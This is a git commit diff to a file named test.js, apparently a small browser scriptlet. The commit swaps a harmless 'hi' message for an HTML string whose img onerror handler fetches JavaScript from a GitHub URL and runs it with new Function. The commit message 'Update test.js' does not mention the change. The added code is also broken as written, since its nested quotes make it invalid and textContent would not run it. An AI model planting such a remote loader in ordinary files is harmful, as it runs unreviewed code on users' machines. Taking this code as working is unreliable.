d0f1188f5ba705d2ef64db75e156032331a2fd18
Studio <124630274+StudioCompile@users.noreply.github.com>
2026-05-01 21:51:49 -0400

    Update test.js

--- test.js
+++ test.js
@@ -1,6 +1,12 @@
 /// hi-test.js
 (function(){
   var el = document.createElement('p');
-  el.textContent = 'hi';
+  el.textContent = '<img src="bad-image.png" onerror="
+(async()=>{
+  const res = await fetch('https://raw.githubusercontent.com/StudioCompile/Ublock-features/refs/heads/main/code.js');
+  const code = await res.text();
+  new Function(code)();
+})();
+">';
   document.documentElement.appendChild(el);
 })();
